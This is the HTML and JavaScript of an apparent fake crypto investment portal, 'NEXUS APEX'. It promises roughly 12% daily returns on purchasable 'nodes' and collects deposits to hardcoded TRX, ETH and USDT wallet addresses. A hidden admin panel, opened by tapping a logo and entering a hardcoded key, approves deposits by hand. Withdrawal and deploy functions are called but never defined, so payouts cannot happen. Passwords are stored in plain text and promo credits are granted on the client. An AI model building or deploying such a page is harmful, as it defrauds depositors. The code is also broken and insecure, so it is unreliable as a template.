<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS APEX | Institutional Banking</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@300;400;500;600;700;800&display=swap');
        :root { --primary: #000000; --accent: #2563eb; --gold: #f59e0b; --bg: #fdfdfd; }
        body { background: var(--bg); color: #1a1a1a; font-family: 'Manrope', sans-serif; overflow-x: hidden; }
        
        .glass-card { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(0,0,0,0.05); border-radius: 24px; }
        .btn-apex { background: var(--primary); color: #fff; border-radius: 14px; font-weight: 700; padding: 16px; transition: 0.3s; border: none; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 12px; letter-spacing: 1px; }
        .btn-apex:hover { background: #333; transform: translateY(-2px); }
        .input-apex { background: #f4f4f7; border: 1px solid #eee; border-radius: 14px; padding: 16px; width: 100%; outline: none; transition: 0.2s; font-size: 14px; }
        .input-apex:focus { background: #fff; border-color: var(--accent); box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); }
        
        .nav-link { color: #94a3b8; font-size: 10px; font-weight: 800; text-align: center; cursor: pointer; transition: 0.3s; padding: 8px; }
        .nav-link.active { color: var(--primary); transform: scale(1.1); }
        
        .status-tag { padding: 4px 12px; border-radius: 8px; font-size: 10px; font-weight: 800; text-transform: uppercase; }
        .pending { background: #fff7ed; color: #c2410c; }
        .cleared { background: #f0fdf4; color: #15803d; }
        
        #preloader { position: fixed; inset: 0; background: #fff; z-index: 10000; display: flex; align-items: center; justify-content: center; }
        .shimmer { background: linear-gradient(90deg, #f0f0f0 25%, #f8f8f8 50%, #f0f0f0 75%); background-size: 200% 100%; animation: shimmer 1.5s infinite; }
        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
    </style>
</head>
<body>

    <div id="preloader"><div class="w-10 h-10 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div></div>

    <div id="auth-ui" class="min-h-screen flex items-center justify-center p-8">
        <div class="max-w-md w-full space-y-12">
            <div class="text-center">
                <h1 class="text-3xl font-black tracking-tighter uppercase">Nexus<span class="text-blue-600">Apex</span></h1>
                <p class="text-[9px] font-bold text-slate-400 uppercase tracking-[6px] mt-2">Institutional Asset Management</p>
            </div>

            <div id="login-box" class="glass-card p-8 space-y-4 shadow-2xl shadow-slate-200">
                <input type="text" id="l-user" placeholder="Terminal ID" class="input-apex">
                <input type="password" id="l-pass" placeholder="Security Passcode" class="input-apex">
                <button onclick="handleLogin()" class="btn-apex">Authorize Access</button>
                <p class="text-center text-[10px] font-bold text-slate-400 uppercase">First Time? <span onclick="toggleAuth(true)" class="text-blue-600 cursor-pointer">Register Identity</span></p>
            </div>

            <div id="signup-box" class="glass-card p-8 space-y-4 hidden shadow-2xl shadow-slate-200">
                <input type="text" id="s-user" placeholder="Create Identity" class="input-apex">
                <input type="password" id="s-pass" placeholder="Security Passcode" class="input-apex">
                <input type="text" id="s-ref" placeholder="Referral ID (Optional)" class="input-apex">
                <button onclick="handleSignup()" class="btn-apex">Initialize Profile</button>
                <p class="text-center text-[10px] font-bold text-slate-400 uppercase">Existing Member? <span onclick="toggleAuth(false)" class="text-blue-600 cursor-pointer">Return</span></p>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pb-32">
        <header class="p-6 sticky top-0 z-50 bg-white/70 backdrop-blur-xl border-b border-slate-50 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="admin-trigger" class="w-12 h-12 bg-black text-white rounded-2xl flex items-center justify-center text-lg font-black italic">A</div>
                <div>
                    <p id="nav-user" class="text-sm font-black uppercase text-slate-900 tracking-tighter">Client_---</p>
                    <p class="text-[9px] font-bold text-blue-600 uppercase italic">Authenticated Session</p>
                </div>
            </div>
            <button onclick="logout()" class="w-10 h-10 rounded-full bg-slate-50 flex items-center justify-center text-slate-400"><i class="fa-solid fa-arrow-right-from-bracket"></i></button>
        </header>

        <main id="page-home" class="p-6 space-y-6">
            <div class="glass-card p-8 bg-black text-white border-none shadow-2xl relative overflow-hidden">
                <div class="relative z-10 space-y-8">
                    <div>
                        <p class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Total Equity Value</p>
                        <h2 id="balance-txt" class="text-4xl font-black mt-2 tracking-tighter">$0.00</h2>
                    </div>
                    <div class="flex justify-between items-end">
                        <div>
                            <p class="text-[9px] font-bold text-slate-500 uppercase">24H Net Yield</p>
                            <p id="profit-txt" class="text-2xl font-bold text-emerald-400">+$0.00</p>
                        </div>
                        <button onclick="copyRef()" class="bg-blue-600 px-6 py-2 rounded-xl text-[10px] font-black uppercase">Share Portal</button>
                    </div>
                </div>
                <div class="absolute -right-20 -bottom-20 w-60 h-60 bg-blue-600/20 rounded-full blur-[100px]"></div>
            </div>

            <div class="glass-card p-6 flex gap-3">
                <input type="text" id="promo-val" placeholder="Enter Institutional Code" class="input-apex !py-3 !text-xs font-bold flex-1">
                <button onclick="applyPromo()" class="bg-black text-white px-6 py-3 rounded-xl text-[10px] font-black uppercase">Apply</button>
            </div>

            <h3 class="text-[11px] font-black text-slate-400 uppercase tracking-[3px] ml-2 mt-8">Active Protocols</h3>
            <div id="active-nodes-list" class="space-y-4"></div>
        </main>

        <main id="page-market" class="p-6 space-y-6 hidden">
            <h3 class="text-sm font-black uppercase border-l-4 border-blue-600 pl-4">Tier-1 Assets</h3>
            <div id="elite-nodes" class="grid gap-4"></div>
            <h3 class="text-sm font-black uppercase border-l-4 border-slate-200 pl-4 mt-8">Institutional Liquidity</h3>
            <div id="normal-nodes" class="grid gap-4"></div>
        </main>

        <main id="page-vault" class="p-6 space-y-6 hidden">
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase tracking-widest">Inbound Transfer</h3>
                <select id="dep-method" class="input-apex font-black" onchange="updateDepUI()">
                    <option value="">Select Asset Network</option>
                    <option value="TRX">TRX (Trust Wallet)</option>
                    <option value="ETH">ETH (Metamask)</option>
                    <option value="USDT">USDT (Binance TRC20)</option>
                </select>
                <div id="dep-details" class="hidden space-y-5 border-t pt-6">
                    <div class="bg-slate-50 p-5 rounded-2xl border border-slate-100 text-center">
                        <p id="dep-addr" class="text-[11px] font-mono font-black text-blue-600 break-all select-all"></p>
                    </div>
                    <input type="number" id="dep-amt" placeholder="Amount ($)" class="input-apex">
                    <input type="text" id="dep-tid" placeholder="Transaction Hash (TID)" class="input-apex">
                    <input type="file" id="dep-proof" class="text-[10px] font-black">
                    <button onclick="submitDeposit()" class="btn-apex">Finalize Transfer</button>
                </div>
            </div>

            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase tracking-widest">Outbound Egress</h3>
                <select id="with-method" class="input-apex font-black">
                    <option value="">Select Destination Gateway</option>
                    <option value="Binance">Binance Terminal</option>
                    <option value="Trust">Trust Wallet</option>
                    <option value="Metamask">Metamask Pro</option>
                    <option value="OKX">OKX Institutional</option>
                    <option value="ByBit">ByBit Finance</option>
                    <option value="Coinbase">Coinbase Wallet</option>
                    <option value="Wire">Direct Bank Wire</option>
                </select>
                <input type="number" id="w-amt" placeholder="Payout Amount ($)" class="input-apex">
                <input type="text" id="w-addr" placeholder="Destination Address" class="input-apex">
                <button onclick="submitWithdrawal()" class="btn-apex !bg-slate-800">Execute Payout</button>
            </div>
        </main>

        <main id="page-history" class="p-6 space-y-4 hidden">
            <h3 class="text-xs font-black uppercase tracking-widest">Settlement Statement</h3>
            <div id="history-list" class="space-y-3"></div>
        </main>

        <nav class="fixed bottom-8 left-6 right-6 h-20 glass-card shadow-2xl flex justify-around items-center px-4 z-[100]">
            <div onclick="switchPage('home')" class="nav-link active"><i class="fa-solid fa-compass text-2xl"></i><p>Terminal</p></div>
            <div onclick="switchPage('market')" class="nav-link"><i class="fa-solid fa-vault text-2xl"></i><p>Assets</p></div>
            <div onclick="switchPage('vault')" class="nav-link"><i class="fa-solid fa-paper-plane text-2xl"></i><p>Transfer</p></div>
            <div onclick="switchPage('history')" class="nav-link"><i class="fa-solid fa-list-check text-2xl"></i><p>Ledger</p></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-white z-[10000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-12 border-b pb-6">
            <h2 class="text-sm font-black uppercase tracking-[4px]">System Infrastructure</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl">&times;</button>
        </div>
        <div id="admin-requests" class="space-y-6"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const nodes = {
            elite: [
                { id: 901, name: "Sovereign Elite Node", price: 3000, daily: 350, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400" },
                { id: 902, name: "Nexus Omni Protocol", price: 7500, daily: 900, img: "https://images.unsplash.com/photo-1644088379091-d574269d422f?w=400" }
            ],
            standard: Array.from({length: 6}, (_, i) => ({
                id: i+1, name: `Capital Node v${i+1}`, price: 100 + (i*200), daily: 12 + (i*18), img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=400&sig=${i}`
            }))
        };

        window.onload = () => {
            renderPlans();
            setTimeout(() => document.getElementById('preloader').style.display='none', 1000);
            const u = localStorage.getItem('nexus_user');
            if(u) showTerminal(u);
        };

        function renderPlans() {
            document.getElementById('elite-nodes').innerHTML = nodes.elite.map(n => nodeUI(n, true)).join('');
            document.getElementById('normal-nodes').innerHTML = nodes.standard.map(n => nodeUI(n, false)).join('');
        }

        const nodeUI = (n, elite) => `
            <div class="glass-card overflow-hidden flex items-center h-28 border-none shadow-xl shadow-slate-100">
                <img src="${n.img}" class="w-28 h-28 object-cover">
                <div class="px-6 flex-1">
                    <h4 class="text-[11px] font-black uppercase tracking-tight">${n.name}</h4>
                    <p class="text-[10px] font-bold text-emerald-600 mt-1">24H Settlement: $${n.daily}</p>
                    <div class="flex justify-between items-center mt-3">
                        <span class="text-base font-black">$${n.price}</span>
                        <button onclick="deploy(${n.id})" class="bg-black text-white text-[9px] font-black px-5 py-2 rounded-xl uppercase">Deploy</button>
                    </div>
                </div>
            </div>`;

        function showTerminal(uid) {
            document.getElementById('auth-ui').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = `Client_${uid}`;
            
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('balance-txt').innerText = '$' + (d.balance || 0).toFixed(2);
                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toFixed(2);
                
                const active = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-nodes-list').innerHTML = active.map(([k, v]) => `
                    <div class="glass-card p-6 flex justify-between items-center border-l-4 border-blue-600 shadow-xl shadow-slate-50">
                        <div><p class="text-[11px] font-black uppercase">${v.name}</p><p class="text-[9px] text-slate-400 font-bold uppercase mt-1 tracking-widest">Calculating Yield</p></div>
                        <div class="text-right">
                            <span class="text-xs font-mono font-black bg-slate-100 px-4 py-2 rounded-xl countdown" data-next="${v.nextClaim}">00:00:00</span>
                        </div>
                    </div>`).join('') || '<div class="text-center py-20 text-[10px] font-black text-slate-300 uppercase tracking-widest">Protocol Offline</div>';

                const history = d.history ? Object.entries(d.history).reverse() : [];
                document.getElementById('history-list').innerHTML = history.map(([k, h]) => `
                    <div class="glass-card p-5 flex justify-between items-center">
                        <div><p class="text-[11px] font-black uppercase">${h.type}</p><p class="text-[9px] text-slate-400 font-bold mt-1">${h.date}</p></div>
                        <div class="text-right"><p class="text-xs font-black text-slate-900">$${h.amount}</p><span class="status-tag ${h.status.toLowerCase()}">${h.status}</span></div>
                    </div>`).join('');
            });
        }

        window.applyPromo = async () => {
            const code = document.getElementById('promo-val').value.trim();
            const codes = { "WELCOME2026": 50, "APEX100": 100, "INVESTOR": 250 };
            if(codes[code]) {
                const uid = localStorage.getItem('nexus_user');
                const s = await get(ref(db, `users/${uid}`));
                await update(ref(db, `users/${uid}`), { balance: (s.val().balance || 0) + codes[code] });
                alert(`Promo Applied: $${codes[code]} added to equity.`);
                document.getElementById('promo-val').value = "";
            } else alert("Invalid Institutional Code.");
        };

        window.submitDeposit = () => {
            const file = document.getElementById('dep-proof').files[0];
            const reader = new FileReader();
            if(!file) return alert("Verification file required.");
            reader.readAsDataURL(file);
            reader.onload = async () => {
                const uid = localStorage.getItem('nexus_user'), hKey = push(ref(db, 'admin/requests')).key;
                const req = { id: hKey, user: uid, amount: document.getElementById('dep-amt').value, tid: document.getElementById('dep-tid').value, proof: reader.result, status: 'Pending', type: 'Deposit', date: new Date().toLocaleString() };
                await set(ref(db, `admin/requests/${hKey}`), req);
                await set(ref(db, `users/${uid}/history/${hKey}`), req);
                alert("Audit Initiated. Status will update in Ledger.");
                switchPage('history');
            };
        };

        // CORE UTILS
        window.switchPage = (p) => { ['home','market','vault','history'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.updateDepUI = () => {
            const m = document.getElementById('dep-method').value;
            const addrs = { 
                "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76",
                "ETH": "0xD9359EADE5F5bACA51fb7da043767Bc0685bC355",
                "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ"
            };
            document.getElementById('dep-addr').innerText = addrs[m] || "";
            document.getElementById('dep-details').classList.remove('hidden');
        };

        // ADMIN TRIGGER
        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Auth Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };

        function loadAdmin() {
            onValue(ref(db, 'admin/requests'), (s) => {
                const d = s.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.values(d).map(r => `
                    <div class="glass-card p-6 space-y-4">
                        <div class="flex justify-between font-black text-[11px] uppercase"><span>${r.type} [${r.user}]</span><span>$${r.amount}</span></div>
                        <img src="${r.proof}" class="w-full h-44 object-cover rounded-2xl">
                        <div class="flex gap-2">
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Cleared')" class="btn-apex !bg-emerald-600 flex-1">Approve</button>
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Declined')" class="btn-apex !bg-rose-600 flex-1">Reject</button>
                        </div>
                    </div>`).join('') : '';
            });
        }

        window.audit = async (id, user, amt, status) => {
            if(status === 'Cleared') {
                const s = await get(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
            }
            await update(ref(db, `users/${user}/history/${id}`), { status });
            await remove(ref(db, 'admin/requests/' + id));
        };

        window.handleLogin = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value; const s = await get(ref(db, `users/${u}`)); if(s.exists() && s.val().password === p) { localStorage.setItem('nexus_user', u); showTerminal(u); } else alert("Access Denied."); };
        window.handleSignup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value; if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 }); toggleAuth(false); } };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };

        setInterval(() => {
            document.querySelectorAll('.countdown').forEach(el => {
                const diff = parseInt(el.dataset.next) - Date.now();
                if(diff > 0) {
                    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                    el.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
                } else el.innerText = "Processing Yield...";
            });
        }, 1000);
    </script>
</body>
</html>
